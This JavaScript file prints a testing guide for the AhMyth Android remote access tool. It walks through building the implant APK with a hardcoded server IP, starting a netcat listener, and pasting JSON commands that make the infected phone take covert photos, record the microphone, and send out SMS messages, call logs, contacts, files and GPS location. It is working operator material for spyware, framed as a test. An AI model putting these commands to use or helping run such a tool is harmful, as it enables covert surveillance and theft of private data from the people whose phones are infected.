// Manual Testing Script for AhMyth Commands
// This script provides instructions for manual testing using netcat

const { exec } = require('child_process');
const fs = require('fs');

console.log('='.repeat(60));
console.log('AhMyth Manual Testing Guide');
console.log('='.repeat(60));
console.log();

console.log('📱 STEP 1: Install and Launch App');
console.log('   - Build APK: cd AhMyth-Client && .\\build-and-run.ps1 -ServerIP "192.168.0.177" -ServerPort 1234');
console.log('   - Grant permissions when prompted');
console.log();

console.log('🖥️  STEP 2: Start Netcat Server');
console.log('   Run this command in a separate terminal:');
console.log('   ncat -l -p 1234 -v');
console.log('   (or: nc -l -p 1234 -v)');
console.log();

console.log('🔍 STEP 3: Verify Connection');
console.log('   When app connects, you should see:');
console.log('   Connection from [IP]:[PORT]');
console.log('   The app will send device info as query parameters');
console.log();

console.log('📋 STEP 4: Test Commands (copy-paste these)');
console.log();

// Commands for testing
const commands = [
    {
        name: 'Camera List',
        command: '{"order":"x0000ca","extra":"camList","action":"camList"}',
        expected: 'Camera list with available cameras'
    },
    {
        name: 'Camera Photo (Back)',
        command: '{"order":"x0000ca","extra":"0","action":"takePic","cameraID":0}',
        expected: 'Photo data (binary)'
    },
    {
        name: 'Camera Photo (Front)',
        command: '{"order":"x0000ca","extra":"1","action":"takePic","cameraID":1}',
        expected: 'Photo data (binary)'
    },
    {
        name: 'File Manager (Root)',
        command: '{"order":"x0000fm","extra":"ls","path":"/"}',
        expected: 'File list for root directory'
    },
    {
        name: 'File Manager (Downloads)',
        command: '{"order":"x0000fm","extra":"ls","path":"/storage/emulated/0/Download"}',
        expected: 'File list for Downloads directory'
    },
    {
        name: 'SMS List',
        command: '{"order":"x0000sm","extra":"ls"}',
        expected: 'SMS messages array'
    },
    {
        name: 'Call Logs',
        command: '{"order":"x0000cl"}',
        expected: 'Call log entries array'
    },
    {
        name: 'Contacts',
        command: '{"order":"x0000cn"}',
        expected: 'Contacts list array'
    },
    {
        name: 'Location',
        command: '{"order":"x0000lm"}',
        expected: 'GPS location data'
    },
    {
        name: 'Microphone (5 sec)',
        command: '{"order":"x0000mc","sec":5}',
        expected: 'Audio data (binary)'
    }
];

commands.forEach((cmd, index) => {
    console.log(`${index + 1}. ${cmd.name}:`);
    console.log(`   Command: ${cmd.command}`);
    console.log(`   Expected: ${cmd.expected}`);
    console.log();
});

console.log('📝 STEP 5: Testing Instructions');
console.log('   1. Wait for app to connect');
console.log('   2. Copy-paste commands one by one');
console.log('   3. Check app logs: adb logcat | findstr ahmyth');
console.log('   4. Verify responses in netcat output');
console.log();

console.log('🔧 STEP 6: Troubleshooting');
console.log('   - If no connection: Check IP address and firewall');
console.log('   - If commands fail: Check app permissions');
console.log('   - If camera fails: May need to bring activity to foreground');
console.log('   - Check logs: adb logcat -s AhMyth');
console.log();

console.log('='.repeat(60));
console.log('Ready to test! Start with Step 1 above.');
console.log('='.repeat(60));

// Auto-start netcat if available
console.log('\n⏳ Attempting to start netcat server...');
exec('ncat -l -p 1234 -v', (error, stdout, stderr) => {
    if (error) {
        console.log('❌ Netcat not available. Please install ncat/nc and run manually.');
        return;
    }
    console.log('✅ Netcat server started. Waiting for connections...');
});

console.log('\n💡 Tip: Run this script, then start netcat in another terminal');
console.log('💡 Tip: Check app logs with: adb logcat | findstr ahmyth');

